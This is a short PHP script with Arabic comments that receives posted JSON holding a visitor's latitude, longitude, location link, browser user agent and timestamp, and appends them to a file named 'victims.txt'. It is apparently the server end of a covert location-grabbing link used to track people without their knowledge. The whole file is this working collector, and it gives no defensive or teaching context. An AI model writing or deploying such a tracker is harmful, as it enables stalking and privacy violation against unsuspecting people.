<?php
// استقبال البيانات JSON
$data = json_decode(file_get_contents("php://input"), true);

if ($data) {
    $latitude = $data['latitude'];
    $longitude = $data['longitude'];
    $locationUrl = $data['locationUrl'];
    $userAgent = $data['userAgent'];
    $timestamp = $data['timestamp'];

    // تخزينهم في ملف أو قاعدة بيانات (هنا نخزنهم في ملف مؤقت لتجربة)
    $entry = "وقت: $timestamp\nموقع: $locationUrl\nجهاز: $userAgent\n\n";
    file_put_contents("victims.txt", $entry, FILE_APPEND);

    echo "تم الحفظ";
} else {
    echo "لم تصل بيانات";
}
?>
